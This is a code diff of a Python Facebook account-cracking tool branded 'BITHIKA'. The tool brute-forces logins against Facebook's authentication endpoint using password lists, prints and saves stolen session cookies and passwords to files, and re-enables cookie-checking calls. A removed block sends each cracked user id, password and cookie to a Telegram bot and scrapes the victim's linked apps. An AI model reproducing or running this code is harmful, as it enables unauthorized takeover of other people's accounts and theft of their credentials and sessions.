@@ -585,7 +585,7 @@ def api1(ids,names,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        #cek_apk(coki)
+                                        cek_apk(coki)
                                         open('/sdcard/BITHIKA-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
@@ -705,7 +705,7 @@ def api2(ids,names,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        #cek_apk(coki)
+                                        cek_apk(coki)
                                         open('/sdcard/BITHIKA-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
@@ -814,7 +814,7 @@ def api3(ids,names,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        #cek_apk(coki)
+                                        cek_apk(coki)
                                         open('/sdcard/BITHIKA-FILE-M3-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
@@ -919,32 +919,12 @@ def rndm1(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        cid = str(po['uid'])
-                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        statusok = (f" {cid} | {pas} | {coki} ")
-                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                                        open('/sdcard/BITHIKA-RANDOM-M1-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
+                                        cek_apk(coki)
+                                        open('/sdcard/BITHIKA-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
-                                        w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
-                                        sop = bs4.BeautifulSoup(w,"html.parser")
-                                        x = sop.find("form",method="post")
-                                        game = [i.text for i in x.find_all("h3")]
-                                        try:
-                                          for i in range(len(game)):
-                                              print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
-                                        except AttributeError:
-                                          print ("\r    %s\033[0m cookie invalid"%(M))
-                                        w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
-                                        sop = bs4.BeautifulSoup(w,"html.parser")
-                                        x = sop.find("form",method="post")
-                                        game = [i.text for i in x.find_all("h3")]
-                                        try:
-                                          for i in range(len(game)):
-                                              print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
-                                        except AttributeError:
-                                           print ("\r    %s \033[0mcookie invalid"%(M))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
